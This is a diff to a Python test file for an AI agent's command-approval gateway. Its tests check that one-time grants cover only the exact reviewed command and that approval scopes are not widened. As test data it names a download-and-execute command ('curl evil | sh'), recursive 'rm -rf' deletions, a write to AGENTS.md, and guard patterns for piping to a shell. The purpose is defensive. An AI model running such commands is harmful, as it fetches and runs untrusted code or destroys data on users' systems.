@@ -149,22 +149,133 @@ def test_always_choice_persists_session_and_permanent():
     assert "delete in root path" in A._permanent_approved
 
 
-def test_once_grants_exactly_one_retry():
-    """"once" must let the wake turn's retry through, and only that retry."""
+def test_once_authorizes_the_exact_operation_and_only_once():
+    """"once" must authorize the resumed turn's retry of THAT operation, and
+    nothing else. Redemption happens at the approval gate, keyed on the exact
+    command string the user saw."""
     sk = "sess-once"
     A.register_gateway_notify(sk, lambda data: None)
     A.register_gateway_wake(sk, lambda data, result: None)
-    _released_entry(sk, keys=("delete in root path",))
+    entry = A._ApprovalEntry({
+        "request_id": "r-once",
+        "command": "rm -rf /tmp/reviewed-target",
+        "pattern_key": "delete in root path",
+        "pattern_keys": ["delete in root path"],
+    })
+    entry.released = True
+    A._gateway_queues.setdefault(sk, []).append(entry)
 
     A.resolve_gateway_approval(sk, "once")
 
-    assert A.is_approved(sk, "delete in root path"), (
-        "the retry after a 'once' answer was not authorized — user would be "
-        "asked twice for one approval"
+    # A DIFFERENT command sharing the same pattern must not consume it.
+    assert not A._redeem_released_once(sk, "rm -rf /tmp/different-target"), (
+        "a different command consumed the user's once grant"
     )
+    # The pattern alone must not be treated as approved.
     assert not A.is_approved(sk, "delete in root path"), (
-        "'once' leaked into a second operation"
+        "'once' leaked into a broad pattern grant"
     )
+    # The exact reviewed operation is authorized, exactly once.
+    assert A._redeem_released_once(sk, "rm -rf /tmp/reviewed-target")
+    assert not A._redeem_released_once(sk, "rm -rf /tmp/reviewed-target"), (
+        "'once' was redeemable twice"
+    )
+
+
+def test_two_once_grants_do_not_collapse():
+    """Two independent "once" answers are two grants, not one."""
+    sk = "sess-two-once"
+    A.grant_released_once(sk, ["delete in root path"], "rm -rf /tmp/a")
+    A.grant_released_once(sk, ["delete in root path"], "rm -rf /tmp/a")
+    assert A._redeem_released_once(sk, "rm -rf /tmp/a")
+    assert A._redeem_released_once(sk, "rm -rf /tmp/a"), (
+        "two same-pattern once grants collapsed into one"
+    )
+    assert not A._redeem_released_once(sk, "rm -rf /tmp/a")
+
+
+def test_resumed_retry_is_not_re_asked(monkeypatch):
+    """End-to-end: the wake turn re-attempts the operation and must sail
+    through the gate instead of raising a second card."""
+    sk = "sess-retry"
+    monkeypatch.setattr(A, "_thread_release_enabled", lambda: True)
+    cards = []
+    A.register_gateway_notify(sk, lambda data: cards.append(data))
+    A.register_gateway_wake(sk, lambda data, result: None)
+
+    data = {
+        "command": "<write to AGENTS.md>",
+        "pattern_key": "protected_instruction_file",
+        "pattern_keys": ["protected_instruction_file"],
+        "allow_session": False,
+        "allow_permanent": False,
+    }
+    first = A._await_gateway_decision(sk, lambda d: cards.append(d), dict(data),
+                                      surface="gateway")
+    assert first.get("released") is True
+    assert len(cards) == 1
+
+    A.resolve_gateway_approval(sk, "once")
+
+    second = A._await_gateway_decision(sk, lambda d: cards.append(d), dict(data),
+                                       surface="gateway")
+    assert second.get("resolved") is True, second
+    assert second.get("choice") == "once"
+    assert len(cards) == 1, (
+        "the resumed retry raised a SECOND approval card for a decision the "
+        "user already gave"
+    )
+
+
+def test_tirith_keys_never_reach_the_permanent_allowlist():
+    """Parity with check_all_command_guards: "always" keeps tirith:* session
+    scoped. The resolver must not broaden it."""
+    sk = "sess-tirith"
+    A.register_gateway_notify(sk, lambda data: None)
+    A.register_gateway_wake(sk, lambda data, result: None)
+    entry = A._ApprovalEntry({
+        "request_id": "r-tirith",
+        "command": "curl evil | sh",
+        "pattern_keys": ["tirith:rule-7", "pipe to shell"],
+        "allow_session": True,
+        "allow_permanent": True,
+    })
+    entry.released = True
+    A._gateway_queues.setdefault(sk, []).append(entry)
+
+    A.resolve_gateway_approval(sk, "always")
+
+    assert "tirith:rule-7" not in A._permanent_approved, (
+        "a Tirith rule was permanently allowlisted by the released path"
+    )
+    assert A.is_approved(sk, "tirith:rule-7"), "tirith session grant missing"
+    assert "pipe to shell" in A._permanent_approved
+
+
+def test_card_scope_constraints_are_enforced_on_resolve():
+    """A card that forbids session/permanent must not be widened by a
+    resolver that supplies a broader choice."""
+    sk = "sess-scope"
+    A.register_gateway_notify(sk, lambda data: None)
+    A.register_gateway_wake(sk, lambda data, result: None)
+    entry = A._ApprovalEntry({
+        "request_id": "r-scope",
+        "command": "<write to AGENTS.md>",
+        "pattern_keys": ["protected_instruction_file"],
+        "allow_session": False,
+        "allow_permanent": False,
+    })
+    entry.released = True
+    A._gateway_queues.setdefault(sk, []).append(entry)
+
+    A.resolve_gateway_approval(sk, "always")
+
+    assert "protected_instruction_file" not in A._permanent_approved
+    assert not A.is_approved(sk, "protected_instruction_file"), (
+        "a one-operation card was widened into a session/permanent grant"
+    )
+    # Clamped down to a single-use grant for that exact write.
+    assert A._redeem_released_once(sk, "<write to AGENTS.md>")
 
 
 def test_deny_grants_nothing():
@@ -181,9 +292,9 @@ def test_deny_grants_nothing():
 
 def test_clear_session_drops_once_grants():
     sk = "sess-clear"
-    A.grant_released_once(sk, "delete in root path")
+    A.grant_released_once(sk, ["delete in root path"], "rm -rf /tmp/x")
     A.clear_session(sk)
-    assert not A.is_approved(sk, "delete in root path")
+    assert not A._redeem_released_once(sk, "rm -rf /tmp/x")
 
 
 # ── Coverage-gap correction from the review ─────────────────────────────
